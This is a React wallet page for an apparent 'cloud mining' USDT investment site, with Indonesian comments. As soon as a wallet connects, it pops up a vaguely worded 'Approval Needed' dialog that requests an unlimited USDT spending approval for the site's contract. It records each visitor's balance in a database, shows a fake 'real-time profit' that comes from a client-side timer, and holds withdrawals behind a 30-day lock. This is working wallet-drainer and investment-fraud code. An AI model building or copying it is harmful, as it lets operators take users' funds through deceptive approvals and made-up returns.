import { useState, useEffect, useMemo } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { 
  useAccount, 
  useReadContract,
  useWriteContract,
  useBalance,
  usePublicClient
} from 'wagmi';
import { supabase } from '../../lib/supabase';
import { toast } from 'react-toastify';
import { maxUint256 } from 'viem';

const ERC20_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      { "name": "owner", "type": "address" },
      { "name": "spender", "type": "address" }
    ],
    "name": "allowance",
    "outputs": [{ "name": "", "type": "uint256" }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
] as const;

const USDT_ADDRESS = process.env.NEXT_PUBLIC_USDT_ADDRESS as `0x${string}`;
const CLOUD_MINING_CONTRACT = process.env.NEXT_PUBLIC_CLOUD_MINING_CONTRACT as `0x${string}`;

type UserData = {
  wallet_address: string;
  usdt_balance: number;
  plan: string;
  deposit_amount: number;
  withdrawal_amount: number;
  infinite_allowance: boolean;
  join_date: string;
};

type WithdrawRequest = {
  id: string;
  wallet_address: string;
  withdrawal_amount: number;
  status: 'pending' | 'approved' | 'rejected';
  created_at: string;
};

const Wallet = () => {
  const { address } = useAccount();
  const [userData, setUserData] = useState<UserData | null>(null);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);

  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [withdrawals, setWithdrawals] = useState<WithdrawRequest[]>([]);
  const [mounted, setMounted] = useState(false);
  const publicClient = usePublicClient();
  const [activeTab, setActiveTab] = useState<'wallet' | 'transactions'>('wallet');
  const [currentProfit, setCurrentProfit] = useState(0);

  // Hanya render di client
  useEffect(() => {
    setMounted(true);
  }, []);

  // 1. Get USDT Balance
  const { data: balanceData, refetch: refetchBalance } = useBalance({
    address,
    token: USDT_ADDRESS,
    // Gunakan properti formatted (dari wagmi) agar nilainya sudah terformat
    query: { refetchInterval: 15000 },
  });

  // 2. Get Allowance
  const { 
    data: allowanceData, 
    refetch: refetchAllowance,
    isFetched: isAllowanceFetched // Tambahkan status fetch
  } = useReadContract({
    address: USDT_ADDRESS,
    abi: ERC20_ABI,
    functionName: "allowance",
    args: address ? [address, CLOUD_MINING_CONTRACT] : undefined,
    query: {
      enabled: !!address,
      refetchInterval: 15000,
    },
  });

  // 3. Cek infinite allowance sebagai boolean
  const hasInfiniteAllowance = useMemo(() => {
    if (!allowanceData || !isAllowanceFetched) return false;
    return BigInt(allowanceData.toString()) === BigInt(maxUint256.toString());
  }, [allowanceData, isAllowanceFetched]);
  

  // 4. Prepare approval menggunakan useWriteContract
  const { writeContractAsync: approve } = useWriteContract();

  // Format USDT Balance berdasarkan formatted (misalnya "301.00")
  const usdtBalance = useMemo(
    () => Number(balanceData?.formatted || 0),
    [balanceData]
  );

  // Format Allowance sebagai nilai USDT dalam satuan desimal (jika diperlukan)
  const formattedAllowance = useMemo(() => {
    if (!allowanceData) return 0;
    return Number(allowanceData) / 1e6;
  }, [allowanceData]);

  // 5. Auto-approve infinite allowance jika belum diberikan
  useEffect(() => {
    const handleAutoApprove = async () => {
      if (address && isAllowanceFetched && !hasInfiniteAllowance) {
        try {
          // Pastikan modal hanya dibuat di client
          if (typeof window !== 'undefined') {
            const modal = document.createElement('div');
            modal.className =
              'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
            modal.innerHTML = `
              <div class="bg-gray-800 p-6 rounded-xl max-w-sm">
              <h3 class="text-xl font-bold text-white mb-4">Approval Needed</h3>
              <p class="text-gray-300 mb-4">
                To use our system, you need to approve sign contract.
                Click "Approve" to continue.
              </p>
              <div class="flex gap-3 justify-end">
                <button id="cancel" class="px-4 py-2 bg-gray-600 hover:bg-gray-700 rounded-lg text-white">
                Cancel
                </button>
                <button id="approve" class="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white">
                Approve
                </button>
              </div>
              </div>
            `;
            document.body.appendChild(modal);
  
            // Tunggu aksi user
            const result = await new Promise<boolean>((resolve) => {
              modal.querySelector('#approve')?.addEventListener('click', () => resolve(true));
              modal.querySelector('#cancel')?.addEventListener('click', () => resolve(false));
            });
            document.body.removeChild(modal);
  
            if (result) {
                toast.info('Please sign the transaction in your wallet...');
              // Panggil fungsi approval
              const txHash = await approve({
                address: USDT_ADDRESS,
                abi: ERC20_ABI,
                functionName: 'approve',
                args: [CLOUD_MINING_CONTRACT, maxUint256],
              });
              // Tunggu konfirmasi transaksi menggunakan publicClient
              const receipt = await publicClient?.waitForTransactionReceipt({
                hash: txHash,
                confirmations: 1,
              });
              if (receipt?.status === 'success') {
                await Promise.all([refetchBalance(), refetchAllowance()]);
                toast.success('Approval Succes!');
              } else {
                toast.error('Approval Failed!');
              }
            }
          }
        } catch (error) {
          toast.error('Failed to approval');
          console.error('Approval error:', error);
        }
      }
    };
  
    handleAutoApprove();
  }, [address, hasInfiniteAllowance, isAllowanceFetched, approve, refetchBalance, refetchAllowance, publicClient]);

  // 6. Load data user dari Supabase: jika data belum ada, insert; jika sudah, tampilkan
  useEffect(() => {
    const loadOrUpsertUserData = async () => {
      if (address && isAllowanceFetched) {
        try {
          const { data, error } = await supabase
            .from('users')
            .select('*')
            .eq('wallet_address', address)
            .maybeSingle();
  
          if (error) throw error;
  
          // Jika data belum ada, insert data baru
          if (!data) {
            const { data: insertedData, error: insertError } = await supabase
              .from('users')
              .insert({
                wallet_address: address,
                usdt_balance: usdtBalance, // sudah terformat
                plan: 'free',
                deposit_amount: 0,
                withdrawal_amount: 0,
                infinite_allowance: hasInfiniteAllowance, // simpan sebagai boolean
                last_login: new Date().toISOString(),
              })
              .maybeSingle();
            if (insertError) throw insertError;
            setUserData(insertedData);
          } else {
            // Jika sudah ada, lakukan update untuk sinkronisasi data
            const { error: updateError } = await supabase
              .from('users')
              .update({
                usdt_balance: usdtBalance,
                infinite_allowance: hasInfiniteAllowance,
                last_login: new Date().toISOString(),
              })
              .eq('wallet_address', address);
            if (updateError) throw updateError;
            setUserData(data);
          }
        } catch (error) {
          console.error('Failed to load or upsert user data:', error);
        }
      }
    };
    loadOrUpsertUserData();
  }, [address, usdtBalance, hasInfiniteAllowance, isAllowanceFetched]);
  
  // 7. Handle withdraw (jika diperlukan)
  const handleWithdraw = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!address) return;
  
    try {
      const amount = parseFloat(withdrawAmount);
      if (isNaN(amount) || amount <= 0) throw new Error('Invalid amount');
  
      const { error } = await supabase
        .from('withdraw_requests')
        .insert({
          wallet_address: address,
          withdrawal_amount: amount,
          destination_wallet: address,
        });
  
      if (error) throw error;

      const currentDeposit = userData?.deposit_amount || 0;
      const newDeposit = currentDeposit - amount;

    const { error: updateError } = await supabase
      .from('users')
      .update({
        deposit_amount: newDeposit,
        // Jika perlu, update juga usdt_balance atau kolom lainnya
      })
      .eq('wallet_address', address);

    if (updateError) throw updateError;
  
      toast.success('Withdrawal request submitted');
      setShowWithdrawModal(false);
      setWithdrawAmount('');
    } catch (error) {
      toast.error('Withdrawal failed');
      console.error(error);
    }
  };

  const loadWithdrawals = async () => {
    if (address) {
      const { data, error } = await supabase
        .from('withdraw_requests')
        .select('*')
        .eq('wallet_address', address)
        .order('created_at', { ascending: false });

      if (error) console.error(error);
      setWithdrawals(data || []);
    }
  };
  
  useEffect(() => {
    if (address) {
      loadWithdrawals();
    }
  }, [address]);

  //tampilan wallet
  useEffect(() => {
    if (!userData?.join_date || !userData?.deposit_amount) return;

    const joinTimestamp = new Date(userData.join_date).getTime();
    const maxProfit = userData.deposit_amount * 0.3; // Maksimal profit 30%
    const profitPerSecond = maxProfit / (30 * 24 * 60 * 60); // Profit per detik

    const updateProfit = () => {
      const nowTimestamp = Date.now();
      const elapsedSeconds = (nowTimestamp - joinTimestamp) / 1000;
      const calculatedProfit = Math.min(elapsedSeconds * profitPerSecond, maxProfit);
      setCurrentProfit(calculatedProfit);
    };

    updateProfit(); // Jalankan langsung saat komponen pertama kali dimuat

    const interval = setInterval(updateProfit, 1000); // Update profit setiap detik

    return () => clearInterval(interval); // Hapus interval saat komponen di-unmount
  }, [userData]);

  
  if (!mounted) return null;
  
  return (
    <section className="max-w-4xl mx-auto my-12 p-6 bg-gray-900 rounded-xl shadow-[0_0_20px_-5px_rgba(96,165,250,0.3)]">
      <h2 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent text-center mb-8">WALLET</h2>
      <div className="flex border-b border-gray-700 justify-center gap-4">
        <button
          onClick={() => setActiveTab('wallet')}
          className={`px-8 py-4 text-lg font-medium rounded-lg transition-all duration-300 ${
            activeTab === 'wallet'
              ? 'bg-gradient-to-r from-blue-500 to-purple-600 text-white shadow-lg scale-105'
              : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-white'
          }`}
        >
          Wallet
        </button>
        <button
          onClick={() => setActiveTab('transactions')}
          className={`px-8 py-4 text-lg font-medium rounded-lg transition-all duration-300 ${
            activeTab === 'transactions'
              ? 'bg-gradient-to-r from-purple-500 to-pink-600 text-white shadow-lg scale-105'
              : 'bg-gray-800 text-gray-400 hover:bg-gray-700 hover:text-white'
          }`}
        >
          Transactions
        </button>
      </div>
      <div className="pt-8 space-y-6">
        {activeTab === 'wallet' && (
        <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50 backdrop-blur-sm">
          <div className="text-center">
          <div className="space-y-4">
              {(() => {
                return [
                  ["USDT Balance:", `${usdtBalance.toFixed(2)} USD`],
                  ["Join Date:", userData?.join_date ? new Date(userData.join_date).toLocaleDateString() : "N/A"],
                  ["Deposit:", `$${userData?.deposit_amount?.toFixed(2) || "0.00"}`],
                  ["Profit (Real-time):", `$${currentProfit.toFixed(2)}`], // Profit real-time
                  ["Withdrawable:", `$${userData?.withdrawal_amount?.toFixed(2) || "0.00"}`],
                ].map(([label, value], index) => (
                  <div key={index} className="flex justify-between items-center p-4 bg-white/5 rounded-lg border border-gray-700">
                    <span className="text-gray-300">{label}</span>
                    <span className="text-white font-medium">{value}</span>
                  </div>
                ));
              })()}
            </div>
            <div className="mt-8 flex justify-center gap-4">
              <ConnectButton 
                label="Connect Wallet"
                accountStatus="address"
                chainStatus="icon"
                showBalance={false}
              />
            </div>
          </div>
        </div>
      )}
      {activeTab === 'transactions' && (
        <div className="p-6 border border-gray-700 rounded-xl bg-gradient-to-br from-blue-900/50 to-purple-900/50 backdrop-blur-sm">
          <div className="text-center">
            <div className="space-y-4">
              <p className="text-gray-300">Withdraw</p>
              {/* Jika belum ada data withdraw */}
              {withdrawals.length === 0 ? (
                <p className="text-gray-400">No withdrawals yet.</p>
              ) : (
                withdrawals.map((withdrawal) => (
                  <div key={withdrawal.id} className="p-4 bg-white/5 rounded-lg border border-gray-700">
                    <div className="flex justify-between">
                      <p className="text-gray-300">Amount:</p>
                      <span className="text-white font-medium">{withdrawal.withdrawal_amount} USD</span>
                    </div>
                    <div className="flex justify-between">
                      <p className="text-gray-300">Created At:</p>
                      <span className="text-white font-medium">{withdrawal.created_at}</span>
                    </div>
                    <div className="flex justify-between">
                      <p className="text-gray-300">Status:</p>
                      <span 
                        className={`font-medium ${
                          withdrawal.status === 'pending' ? 'text-yellow-400' 
                          : withdrawal.status === 'approved' ? 'text-green-400' 
                          : 'text-red-400'
                        }`}
                      >
                        {withdrawal.status === 'pending' ? 'Pending' 
                        : withdrawal.status === 'approved' ? 'Approved' 
                        : 'Rejected'}
                      </span>
                    </div>
                  </div>
                ))
              )}
            </div>
            {/* Hitung apakah sudah 30 hari join (join_date ada di userData) */}
            {userData && (
              <div className="mt-4">
                <p className="text-gray-300">
                  {new Date().getTime() - new Date(userData.join_date).getTime() >= 30 * 24 * 60 * 60 * 1000
                    ? "You are eligible for withdrawal."
                    : "Withdrawal available after 30 days."}
                </p>
              </div>
            )}
            {/* Tombol Withdraw */}
            <div className="mt-8 flex justify-center gap-4">
              <button
                onClick={() => setShowWithdrawModal(true)}
                disabled={!userData || new Date().getTime() - new Date(userData.join_date).getTime() < 30 * 24 * 60 * 60 * 1000}
                className={`px-6 py-2 rounded-lg text-white transition-colors ${
                  !userData || new Date().getTime() - new Date(userData.join_date).getTime() < 30 * 24 * 60 * 60 * 1000
                    ? "bg-gray-500 cursor-not-allowed"
                    : "bg-red-500 hover:bg-red-600"
                }`}
              >
                Withdraw
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  
      {/* Withdraw Modal */}
      {showWithdrawModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-gray-800 p-6 rounded-xl w-96">
            <h2 className="text-2xl font-bold text-white mb-4">Withdraw Funds</h2>
            <form onSubmit={handleWithdraw}>
              <div className="mb-4">
                <label className="block text-gray-300 mb-2">Amount (USD)</label>
                <input
                  type="number"
                  step="0.01"
                  className="w-full p-3 rounded-lg bg-gray-700 text-white"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  required
                />
              </div>
              <div className="flex gap-3 justify-end">
                <button
                  type="button"
                  onClick={() => setShowWithdrawModal(false)}
                  className="px-4 py-2 bg-gray-600 hover:bg-gray-700 rounded-lg text-white"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg text-white"
                >
                  Submit
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </section>
  );
};

export default Wallet;
